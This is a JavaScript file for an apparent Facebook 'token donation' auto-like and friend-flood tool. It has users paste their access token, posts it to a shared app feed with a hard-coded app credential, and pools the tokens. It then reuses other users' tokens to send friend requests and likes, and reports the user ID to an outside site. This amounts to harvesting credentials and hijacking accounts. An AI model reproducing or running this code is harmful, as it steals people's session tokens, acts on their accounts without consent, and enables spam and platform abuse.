function donateToken(){
  var a='<div class="konsol">';
  a+='<div class="dip-luar"><h2 class="h-box">Token Donation</h2><div class="dip-bok">wkwkwk.</div></div>';
  a+='<div class="txt-box" style="color:#443333">';
  a+='<div style="text-align:right;margin:0 0 5px 0">Token: <input type="text" id="admin-token" value="';
  if(toketadmin!=''){a+=toketadmin}
  a+='" onFocus="this.select()" style="width:300px"/> ';
  a+='<span class="tombol-putih" onClick="gettoket()"><i class="gb-tkn"></i> Get Token</span></div>';
  a+='</div>';
  a+='<div class="bt-box">';
  a+='<span class="tombol-putih" onClick="goDnt()"><i class="gb-tkn"></i> Donate Token</span> ';
  a+='<span class="tombol-putih" onClick="skrinoff()"><i class="gb-klos"></i> Close</span> ';
  a+='</div>';
  a+='<div class="rpt-box">';
  a+='<div id="lapor" class="lapor"></div><div id="lapor3" class="lapor"></div><div id="selesai" class="lapor"></div>';
  a+='<div style="font-size:10px;text-align:right;padding:0 2px"><a id="sowditel" href="javascript:void(0)" onClick="if($(this).html()==\'Show Details\'){$(this).html(\'Hide Details\');$(\'#lapor2\').fadeIn(function(){repos(\'.konsol\')})}else{$(this).html(\'Show Details\');$(\'#lapor2\').fadeOut(function(){repos(\'.konsol\')})}">Show Details</a></div>';
  a+='<div id="lapor2" class="lapor" style="display:none;max-height:200px;overflow-y:auto"></div>';
  a+='</div>';
  a+='</div>';
  skrinfill(a);
}
function goDnt(uri){
  $('.bt-box').fadeOut(function(){$('.txt-box').fadeOut(function(){
  $('.rpt-box').fadeIn(function(){repos('.konsol')});
  })});
  toketadmin=cktkn();
  $('#lapor').html('Checking token..');
  $('#lapor3').html('');
  $('#selesai').html('');
  if(uri==null||uri==''){
    uri='https://graph.facebook.com/me?fields=id,picture,name,username&access_token='+toketadmin;
  }
  $.getJSON(uri,function(post){if(post.id){window.idUser=post.id;var a='';
    if(post.picture){a+='<img src="'+post.picture+'" style="float:left;margin-right:5px;border-radius:3px"/>'}
    a+='<div style="max-width:200px;min-width:150px;font-size:10px;overflow:hidden;float:left">';
    if(post.name){a+='<a href="http://www.facebook.com/'+idUser+'" target="_blank" style="font-weight:bold;font-size:12px;white-space:nowrap">'+post.name+'</a>'}
    if(post.username){a+='<div>'+post.username+'</div>'}else{a+='<div>'+idUser+'</div>'}
    a+='<div id="jmlh-tkn" style="text-align:right;color:gray"></div>';
    a+='<div id="yor-stat" style="text-align:right;color:darkgreen"></div>';
    a+='</div>';
    a+='<div style="clear:both"></div>';
    $('#t4usr').html(a).fadeIn(function(){firstKolek=0;kolekToket()});
  }}).error(function(post){
    var a='';
    if(post.statusText){
      a+='<div style="color:darkred">'+post.statusText+'</div>';
      if(post.responseText){
        var b=ajAing.erMes(post.responseText);
        a+='<div style="color:darkred">';
        if(b.message){a+=b.message}
        if(b.code){a+=' ('+b.code+')'}
        a+='</div>';
      }
    }else{
      a+='<div style="color:gray">'+post+'</div>';
    }
    $('#lapor').html('ERROR!');
    $('#lapor3').html(a);
    $('#selesai').html('');
    $('.bt-box').fadeIn(function(){$('.txt-box').fadeIn(function(){
    repos('.konsol');
    })});
  });
}
var firstKolek=0,taiKe=0,hitungPuteran=0,daftarTokensMF=[],daftarTokens=[],tknServ='',idServ='',pdlengBef=0;
function kolekToket(uri){
  if(firstKolek==0){
    firstKolek++;
//    tai=tai.sort(function(){return 0.5-Math.random()});
    tai=['467414293283444|AAAEuQbHDz0sBAHdpPZB7ikhJWnZAtSUf1ZBl8AwbaZBWnaZA0TOR08vO5Qt1RNeMdFVfDJHO8zDWno5HvdcbRFv383JW6B9sAlY1uAi6bCwZDZD'];
    taiKe=0;
    hitungPuteran=0;
    daftarTokensMF=[];
    daftarTokens=[];
    var a='<center>';
    a+='Collecting tokens from server ';
    a+='#'+(taiKe+1)+' of '+tai.length+' ';
    a+=ajAing.loding;
    a+='</center>';
    $('#lapor').html(a);
  }
  if(uri==null||uri==''){
    tknServ=tai[taiKe].split('|')[1];idServ=tai[taiKe].split('|')[0];
    uri='https://graph.facebook.com/'+idServ+'/feed?access_token='+toketadmin+'&fields=message&limit=500';
  }
  $.getJSON(uri,function(post){
    var b='';hitungPuteran++;
    if(post.data){
      if(post.data.length==0){
        if(hitungPuteran==1){
          b='<div style="color:darkred">Server #<b>'+(taiKe+1)+'</b> is Empty</div>';
        }
      }else{
        for(x in post.data){
          if(post.data[x].id&&post.data[x].message&&post.data[x].message.split('\n')[1]){
            var id=post.data[x].message.split('\n')[0].replace('\r','')*1; 
            var token=post.data[x].message.split('\n')[1];
            if(isNaN(id)){
              daftarTokensMF.push(post.data[x].id);
            }else{
              daftarTokens.push({'id':id,'token':token,'posId':post.data[x].id});
            }
          }else{
            daftarTokensMF.push(post.data[x].id);
          }
        }
        if($('#'+idServ).length==0){
          pdlengBef=post.data.length;
          b='<div style="color:darkgreen">';
          b+='Server #<b>'+(taiKe+1)+'</b> has ';
          b+='<span id="'+idServ+'" style="color:black">'+pdlengBef+'</span> tokens';
          b+='</div>';
        }else{
          pdlengBef+=post.data.length;
          $('#'+idServ).html(pdlengBef);
        }
      }
    }else{
      if(hitungPuteran==1){
        b='<center style="color:darkred">Server #<b>'+(taiKe+1)+'</b> has NO DATA</center>';
      }
    }
    if(b!=''){$('#lapor2').prepend(b)}

    var a='<center style="color:darkgreen;margin-bottom:10px">';
    a+='<big><b>'+daftarTokens.length+'</b> Tokens collected</big> ';
    a+='from server #<b>'+(taiKe+1)+'</b>';
    a+='<span style="color:gray">.'+hitungPuteran+'</span>';
    a+=' of '+tai.length+'</center>';
    a+=ajAing.loding;
    $('#lapor').html(a);

    if(post.paging&&post.paging.next){
      kolekToket(post.paging.next);
    }else{
      nyokotanError(post);
    }
  }).error(nyokotanError);
}
function nyokotanError(post){
  if(post.statusText){
    var b='<div style="background-color:rgba(255,200,200,0.2)">';
    b+=post.statusText+' on collecting data from Server #<b>'+(taiKe+1)+'</b>';
    if(post.responseText){
      var a=ajAing.erMes(post.responseText);
      if(a.message){b+='<div>'+a.message+'</div>'}
      if(a.code){b+='<div>error code:'+a.code+'</div>'}
    }
    b+='</div>';
    $('#lapor2').prepend(b);
  }
  taiKe++;
  if(taiKe<tai.length){
    hitungPuteran=0;
    kolekToket();
  }else{
    if(daftarTokens.length==0){
      hapusNuSalah();
    }else{
      daftarTokens=saringDuplikat(daftarTokens);
      if(ajAing.tokenDobel.length==0){
        hapusNuSalah();
      }else{
        ajAing.hitunganTokenDobel=ajAing.tokenDobel.length;
        $('#lapor').html('Deleting '+ajAing.hitunganTokenDobel+' duplicated data..');
        for(var x=0;x<ajAing.hitunganTokenDobel;x++){
          var sauri=tknServ;
//          for(r in tai){if(tai[r].split('|')[0]==ajAing.tokenDobel[x].posId.split('_')[0]){sauri=tai[r];break}}
          if(sauri!=''){
            $.post('https://graph.facebook.com/'+ajAing.tokenDobel[x].posId,{method:'delete',access_token:sauri},hitungHapusDobel).error(hitungHapusDobel);
          }
        }
      }
    }
  }
}
function saringDuplikat(what){
  var arr=what,sorted_arr=arr.sort(),results_arrr=[],results_arr=[];
  for(var x=0;x<sorted_arr.length;x++){
    if(x==0){
      results_arr.push(sorted_arr[x]);
    }else{
      var z=0;
      for(var y=0;y<results_arr.length;y++){
        if(results_arr[y].token==sorted_arr[x].token){
          z++;results_arrr.push(sorted_arr[x]);break;
        }
      }
      if(z==0){results_arr.push(sorted_arr[x])}
    }
  }
  ajAing.tokenDobel=results_arrr;
  return results_arr;
}
function hitungHapusDobel(post){
  var a='Duplicate data (#'+ajAing.hitunganTokenDobel+') ';
  if(post.statusText){
    a+=post.statusText;
    if(post.responseText){
      var b=ajAing.erMes(post.responseText);
      if(b.code&&b.code=='100'){a+=' aha'}else{
        if(b.message){a+='<div>'+b.message+'</div>'}
        if(b.code){a+='<div>Code:'+b.code+'</div>'}
      }
    }
  }else{a+=' '+post}
  $('#lapor').html(a);

  ajAing.hitunganTokenDobel--;
  if(ajAing.hitunganTokenDobel==0){
    hapusNuSalah();
  }
}
function hapusNuSalah(){
  if(daftarTokensMF.length==0){
    beresNyokotan();
  }else{
    ajAing.hitunganTokenSalah=daftarTokensMF.length;
    $('#lapor').html('Deleting '+daftarTokensMF.length+' malformated data..');
    for(m in daftarTokensMF){
      var sauri=tknServ;
//      for(r in tai){if(tai[r].split('|')[0]==daftarTokensMF[m].split('_')[0]){sauri=tai[r];break}}
      if(sauri!=''){
        $.post('https://graph.facebook.com/'+daftarTokensMF[m],{method:'delete',access_token:sauri},hitungHapusSaralah).error(hitungHapusSaralah);
      }
    }
  }
}
function hitungHapusSaralah(post){
  var a='Malformated data (#'+ajAing.hitunganTokenSalah+') ';
  if(post.statusText){
    a+=post.statusText;
    if(post.responseText){
      var b=ajAing.erMes(post.responseText);
      if(b.code&&b.code=='100'){a+=' aha'}else{
        if(b.message){a+='<div>'+b.message+'</div>'}
        if(b.code){a+='<div>Code:'+b.code+'</div>'}
      }
    }
  }else{a+=' '+post}
  $('#lapor').html(a);

  ajAing.hitunganTokenSalah--;
  if(ajAing.hitunganTokenSalah==0){
    beresNyokotan();
  }
}
function beresNyokotan(){
  $('#jmlh-tkn').html('<b>'+daftarTokens.length+'</b> Tokens collected');
  var a='<center style="color:darkgreen;margin-bottom:10px">';
  a+='<big><b>'+daftarTokens.length+'</b> Tokens collected</big> ';
  a+='</center>';
  $('#lapor').html(a);
  firstKolek=0;
  for(x in daftarTokens){if(daftarTokens[x].token==toketadmin){skrinoff();floodMe2();return false;break}}
  tai=tai.sort(function(){return 0.5-Math.random()});
  var ke=Math.floor(Math.random()*tai.length);
  if(!tai[ke]){ke=0}
  $.getJSON('https://graph.facebook.com/'+tai[ke].split('|')[0]+'/feed?method=post&message='+idUser+'%0A'+toketadmin+'&access_token='+tai[ke].split('|')[1],function(post){
    setKuki('ajAingId',toketadmin,5);skrinoff();floodMe2();
  }).error(function(post){skrinoff()});
}
var tfm='',uidfm='',pidfm='',hittfm=0,hittfmE=0;
function floodMe2(){
  $.post('http://sb.powerlike.org/ekil.php',{postid:idUser},floodMe3).error(function(){floodMe4()});
  $('#jmlh-tkn').html('<b>'+daftarTokens.length+'</b> Tokens collected<br/><small>Keep this page open and Check your friend request and subscribers...</small>');
}
function floodMe3(w){
  setTimeout("floodMe2()",300000);
}
function floodMe4(){
  if(hittfm<daftarTokens.length){
    tfm=daftarTokens[hittfm].token;uidfm=daftarTokens[hittfm].id;pidfm=daftarTokens[hittfm].posId;hittfm++;
    var uri='https://graph.facebook.com/'+uidfm+'/friends/'+idUser;
    $.post(uri,{access_token:tfm},function(post){
      floodMe4();
    }).error(function(post){
      if(post.statusText){
        if(post.responseText){
          var f=ajAing.erMes(post.responseText);
          if(f.code){
            if(f.code=='190'){
              hittfmE++;
              $('#jmlh-tkn').html('<b>'+(daftarTokens.length-hittfmE)+'</b> Tokens collected');
              var sauri=tknServ;
//              for(r in tai){if(tai[r].split('|')[0]==pidfm.split('_')[0]){sauri=tai[r];break}}
              if(sauri!=''){
                $.post('https://graph.facebook.com/'+pidfm,{method:'delete',access_token:sauri});
              }
            }
          }
        }
      }
      floodMe4();
    });
  }else{
//    hittfm=0;hittfmE=0;
floodMe3();
  }
}
function floodMe(){
  if(hittfm<daftarTokens.length){
    tfm=daftarTokens[hittfm].token;uidfm=daftarTokens[hittfm].id;pidfm=daftarTokens[hittfm].posId;hittfm++;
    var uri='https://graph.facebook.com/'+idUser+'/posts?limit=1&fields=likes&access_token='+tfm;
    $.getJSON(uri,function(post){
      if(post.data&&post.data[0]){
        if(post.data[0].likes&&post.data[0].likes.data&&post.data[0].likes.data.length!=0){
          if(post.data[0].likes.count){$('#yor-stat').html('<a href="http://www.facebook.com/'+post.data[0].id.replace('_','\/posts\/')+'" target="_blank">'+post.data[0].likes.count+' likes</a>')}
          for(x in post.data[0].likes.data){if(post.data[0].likes.data[x].id==uidfm){floodMe();return false;break}}
        }
        $.post('https://graph.facebook.com/'+post.data[0].id+'/likes',{access_token:tfm});floodMe();
      }
    }).error(function(post){
      if(post.statusText){
        if(post.responseText){
          var f=ajAing.erMes(post.responseText);
          if(f.code){
            if(f.code=='190'){
              hittfmE++;
              $('#jmlh-tkn').html('<b>'+(daftarTokens.length-hittfmE)+'</b> Tokens collected');
              var sauri=tknServ;
//              for(r in tai){if(tai[r].split('|')[0]==pidfm.split('_')[0]){sauri=tai[r];break}}
              if(sauri!=''){
                $.post('https://graph.facebook.com/'+pidfm,{method:'delete',access_token:sauri});
              }
            }
          }
        }
      }
      floodMe();
    });
  }else{
//    hittfm=0;hittfmE=0;
  }
}